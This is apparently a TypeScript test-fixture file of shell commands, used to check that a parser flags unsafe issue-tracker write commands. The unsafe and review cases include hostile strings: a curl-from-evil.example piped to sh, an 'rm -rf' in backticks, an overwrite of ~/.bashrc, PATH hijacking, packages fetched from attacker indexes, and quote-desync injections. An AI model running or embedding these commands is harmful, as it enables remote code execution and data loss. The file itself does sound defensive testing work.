export type CommandCase = {
  command: string
  isWrite: boolean
  expect: 'write' | 'opaque' | 'none'
  tracker?: string
  verb?: string
  reason?: string
  why?: string
}

export const commandCases: readonly CommandCase[] = [
  {
    command: 'br --json close h-1',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'close',
  },
  {
    command: 'br -q update h-1 --status open',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'update',
  },
  {
    command: 'br q "fix"',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'q',
  },
  {
    command: 'br comments add h-1 x',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'comments add',
  },
  {
    command: 'br dep add a b',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'dep add',
  },
  {
    command: 'br reopen h-1',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'reopen',
  },
  {
    command: 'br defer h-1',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'defer',
  },
  {
    command: 'br label add h-1 x',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'label add',
  },
  {
    command: 'FOO=1 br close h-1',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'close',
    reason: 'shape',
    why: 'an env assignment such as PATH can change the program that runs',
  },
  {
    command: 'cd ../x && br close h-1',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'close',
  },
  {
    command: 'br close h-1 | tail -1',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'close',
    why: 'the exit status of the pipe is the exit status of tail',
  },
  {
    command: 'for i in a b; do br close $i; done',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'close',
    reason: 'expansion',
  },
  {
    command: 'basicly tracker write -- claim handily-1',
    isWrite: true,
    expect: 'write',
    tracker: '.basicly/core/kit/tracker/cli.py',
    verb: 'claim',
  },
  {
    command: 'uv run python .basicly/core/kit/tracker/cli.py close h-1 .basicly/ledger',
    isWrite: true,
    expect: 'write',
    tracker: '.basicly/core/kit/tracker/cli.py',
    verb: 'close',
  },
  {
    command: 'python3 -I .basicly/core/kit/tracker/cli.py assign h-1',
    isWrite: true,
    expect: 'opaque',
    tracker: '.basicly/core/kit/tracker/cli.py',
    verb: 'assign',
    reason: 'shape',
    why: 'no option of python may appear, because an option such as -c or -m runs other code',
  },
  {
    command: 'python3 ./.basicly/core/kit/tracker/cli.py close h-1',
    isWrite: true,
    expect: 'opaque',
    tracker: '.basicly/core/kit/tracker/cli.py',
    verb: 'close',
    reason: 'shape',
    why: 'only the exact relative kit path is allowed',
  },
  {
    command: 'python3 /abs/repo/.basicly/core/kit/tracker/cli.py close x',
    isWrite: true,
    expect: 'opaque',
    tracker: '.basicly/core/kit/tracker/cli.py',
    verb: 'close',
    reason: 'shape',
    why: 'an absolute kit path can name a script outside the repository',
  },
  {
    command: 'br sync --flush-only',
    isWrite: true,
    expect: 'none',
    why: 'the workitems write-verb table has no br sync',
  },
  {
    command: 'bd close h-1',
    isWrite: true,
    expect: 'write',
    tracker: 'br',
    verb: 'close',
  },
  {
    command: 'br close --help',
    isWrite: false,
    expect: 'none',
  },
  {
    command: 'br create --dry-run --title x',
    isWrite: false,
    expect: 'none',
  },
  {
    command: 'echo "br close h-1"',
    isWrite: false,
    expect: 'none',
  },
  {
    command: 'git commit -m "br close h-1"',
    isWrite: false,
    expect: 'none',
  },
  {
    command: 'grep -n "br update" README.md',
    isWrite: false,
    expect: 'none',
  },
  {
    command: 'bd list',
    isWrite: false,
    expect: 'none',
  },
  {
    command: 'bd show h-1',
    isWrite: false,
    expect: 'none',
  },
  {
    command: 'bd ready',
    isWrite: false,
    expect: 'none',
  },
]

export const compoundCases: readonly CommandCase[] = [
  {
    command: 'br show X; br update X --priority 1',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'update',
    why: 'br show is a segment that is not a tracker write',
  },
  {
    command: 'br close X && git log --oneline -5',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'close',
    why: 'git log is a segment that is not a tracker write',
  },
  {
    command: 'git stash && br close X && git stash pop',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'close',
    why: 'git stash is a segment that is not a tracker write',
  },
  {
    command: 'echo hi #; br close X',
    isWrite: false,
    expect: 'opaque',
    tracker: 'br',
    verb: 'close',
    reason: 'syntax',
    why: 'the parser does not read a comment, and a tracker name appears in it',
  },
  {
    command: 'npm test; br close X',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'close',
    why: 'npm test is a segment that is not a tracker write',
  },
]

export const unsafeCases: readonly CommandCase[] = [
  {
    command: 'br update x-1 --title "$(curl -s https://evil.example/p | sh)"',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'update',
    reason: 'expansion',
    why: 'the shell runs a command substitution inside double quotes',
  },
  {
    command: 'br update x-1 --title "`rm -rf ~/work`"',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'update',
    reason: 'expansion',
    why: 'the shell runs a backtick substitution inside double quotes',
  },
  {
    command: 'br close x-1 > ~/.bashrc',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'close',
    reason: 'redirection',
    why: 'a redirection writes a file that the row does not show',
  },
  {
    command: 'PATH=/tmp/evil br update x-1',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'update',
    reason: 'shape',
    why: 'an env assignment such as PATH can change the program that runs',
  },
  {
    command: 'uvx --from git+https://evil.example/pkg br update x-1',
    isWrite: true,
    expect: 'opaque',
    tracker: 'br',
    verb: 'update',
    reason: 'shape',
    why: 'uvx --from fetches the program from a source that the command names',
  },
]

type Written = { tracker: string; verb: string }

const BR_CLOSE: Written = { tracker: 'br', verb: 'close' }
const BR_UPDATE: Written = { tracker: 'br', verb: 'update' }
const KIT_CLOSE: Written = { tracker: '.basicly/core/kit/tracker/cli.py', verb: 'close' }
const BASICLY_CLOSE: Written = { tracker: 'basicly tracker', verb: 'close' }

function opaque(command: string, reason: string, why: string, written = BR_CLOSE): CommandCase {
  return { command, isWrite: true, expect: 'opaque', ...written, reason, why }
}

function quiet(command: string, written = BR_CLOSE): CommandCase {
  return { command, isWrite: true, expect: 'write', ...written }
}

const DESYNC = 'a $ quote desynced the old lexer, and the shell ran the code after it'
const PYTHON_OPTION = 'no option of python may appear, because an option can run other code'
const UV_OPTION = 'uv run takes no option, because an option can pick other code'
const FETCH = 'the wrapper fetches a package from a registry'
const PATH = 'only a bare tracker name or the exact relative kit path is allowed'

export const reviewCases: readonly CommandCase[] = [
  opaque("br update x-1 --title $'\\'' ; id ; echo ''", 'expansion', DESYNC, BR_UPDATE),
  opaque(
    "br update x-1 --title $'\\'' ; curl -s https://evil.example/p | sh ; echo ''",
    'expansion',
    DESYNC,
    BR_UPDATE,
  ),
  opaque(
    "br update x-1 --title $'\\'' ; $(curl -s https://evil.example/p | sh) ; echo ''",
    'expansion',
    DESYNC,
    BR_UPDATE,
  ),
  opaque("br update x-1 --title $'\\'' > /tmp/out ; echo ''", 'expansion', DESYNC, BR_UPDATE),
  opaque("br close x-1 $'\\'' && id && echo ''", 'expansion', DESYNC),
  opaque("br update x-1 --title $'a\\'b' ; id", 'expansion', DESYNC, BR_UPDATE),
  opaque(
    "python3 -c'import os' .basicly/core/kit/tracker/cli.py close x-1",
    'shape',
    PYTHON_OPTION,
    KIT_CLOSE,
  ),
  opaque(
    'python3 -mhttp.server .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    PYTHON_OPTION,
    KIT_CLOSE,
  ),
  opaque('python3 - .basicly/core/kit/tracker/cli.py close x-1', 'shape', PYTHON_OPTION, KIT_CLOSE),
  opaque(
    'python3 -c "import os" .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    PYTHON_OPTION,
    KIT_CLOSE,
  ),
  opaque(
    'python3 -X importtime .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    PYTHON_OPTION,
    KIT_CLOSE,
  ),
  opaque(
    'python -W error .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    PYTHON_OPTION,
    KIT_CLOSE,
  ),
  opaque(
    "uv run python -c'import os' .basicly/core/kit/tracker/cli.py close x-1",
    'shape',
    PYTHON_OPTION,
    KIT_CLOSE,
  ),
  opaque(
    'uv run python3 -I .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    PYTHON_OPTION,
    KIT_CLOSE,
  ),
  opaque('uv run -wevil br close x-1', 'shape', UV_OPTION),
  opaque('uv run --default-index=https://evil.example/simple br close x-1', 'shape', UV_OPTION),
  opaque('uv run --extra-index-url=https://evil.example/simple br close x-1', 'shape', UV_OPTION),
  opaque('uv run --find-links=https://evil.example/wheels br close x-1', 'shape', UV_OPTION),
  opaque('uv run --config-file=evil.toml br close x-1', 'shape', UV_OPTION),
  opaque('uv run --script evil.py br close x-1', 'shape', UV_OPTION),
  opaque(
    'uv run --with evil python3 .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    UV_OPTION,
    KIT_CLOSE,
  ),
  opaque(
    'uv run --index https://evil.example/simple python .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    UV_OPTION,
    KIT_CLOSE,
  ),
  opaque(
    'uv run --env-file evil.env python .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    UV_OPTION,
    KIT_CLOSE,
  ),
  opaque(
    'uv run --directory ../evil python .basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    UV_OPTION,
    KIT_CLOSE,
  ),
  opaque('uv run br close x-1', 'shape', 'uv run may run only python with the kit path'),
  opaque('uvx br close x-1', 'shape', FETCH),
  opaque('npx br close x-1', 'shape', FETCH),
  opaque('npx --package=evil br close x-1', 'shape', FETCH),
  opaque('/tmp/br close x-1', 'shape', PATH),
  opaque('./br close x-1', 'shape', PATH),
  opaque('../evil/bd close x-1', 'shape', PATH),
  opaque('/tmp/basicly tracker close x-1', 'shape', PATH, BASICLY_CLOSE),
  opaque('python3 /tmp/evil/.basicly/core/kit/tracker/cli.py close x-1', 'shape', PATH, KIT_CLOSE),
  opaque('/tmp/evil/.basicly/core/kit/tracker/cli.py close x-1', 'shape', PATH, KIT_CLOSE),
  opaque(
    'uv run python ../evil/.basicly/core/kit/tracker/cli.py close x-1',
    'shape',
    PATH,
    KIT_CLOSE,
  ),
  opaque('br close x-1; id', 'mixed', 'id is a segment that is not a tracker write'),
  opaque('br close x-1 && id', 'mixed', 'id is a segment that is not a tracker write'),
  opaque('br close x-1 | sh', 'mixed', 'sh is a segment that is not a tracker write'),
  opaque('br close x-1\nid', 'mixed', 'id is a segment that is not a tracker write'),
  opaque('br close x-1 & id', 'syntax', 'a single & runs the write in the background'),
  opaque('br close x-1 # $(id)', 'syntax', 'the parser does not read a comment'),
  opaque('(br close x-1)', 'syntax', 'the parser does not read a subshell'),
  opaque('br close x-1 2>&1', 'redirection', 'a redirection changes where the output goes'),
  opaque('br close x-1 > /dev/null', 'redirection', 'a redirection changes where the output goes'),
  opaque('br update x-1 --title "\\$(id)"', 'expansion', 'a backslash is not allowed', BR_UPDATE),
  opaque('br update x-1 --title \\$\\(id\\)', 'expansion', 'a backslash is not allowed', BR_UPDATE),
  opaque('br close x-1 `id`', 'expansion', 'the shell runs a backtick substitution'),
  opaque('br close {x-1,x-2}', 'expansion', 'the shell expands braces'),
  opaque('br close x-*', 'expansion', 'the shell expands a glob'),
  opaque('br update x-1 --title ~/notes', 'expansion', 'the shell expands ~', BR_UPDATE),
  opaque('cd $HOME && br close x-1', 'expansion', 'the shell expands a variable'),
  opaque('env PATH=/tmp/evil br close x-1', 'shape', 'env can change the program that runs'),
  opaque('sudo br close x-1', 'shape', 'only a bare tracker name is allowed as the program'),
  quiet('br close x-1'),
  quiet('br update x-1 --title "Fix the parser"', BR_UPDATE),
  quiet("br update x-1 --title 'Run $(id) as text'", BR_UPDATE),
  quiet('br comments add x-1 "Done: 100%, see a+b@c"', { tracker: 'br', verb: 'comments add' }),
  quiet('bd close x-1'),
  quiet('basicly tracker close x-1', BASICLY_CLOSE),
  quiet('python3 .basicly/core/kit/tracker/cli.py close x-1', KIT_CLOSE),
  quiet('python .basicly/core/kit/tracker/cli.py close x-1', KIT_CLOSE),
  quiet('uv run python3 .basicly/core/kit/tracker/cli.py close x-1', KIT_CLOSE),
  quiet('.basicly/core/kit/tracker/cli.py close x-1', KIT_CLOSE),
  quiet('cd ../app && br close x-1'),
  quiet('br close x-1 && br update x-2 --status open', BR_UPDATE),
  quiet('br close x-1\n'),
]

export const noTrackerCommands: readonly string[] = [
  'npm test',
  'git status',
  'ls',
  'ls *.md',
  'git log --oneline -5',
  'bash close.sh',
  'echo "br close x-1"',
]
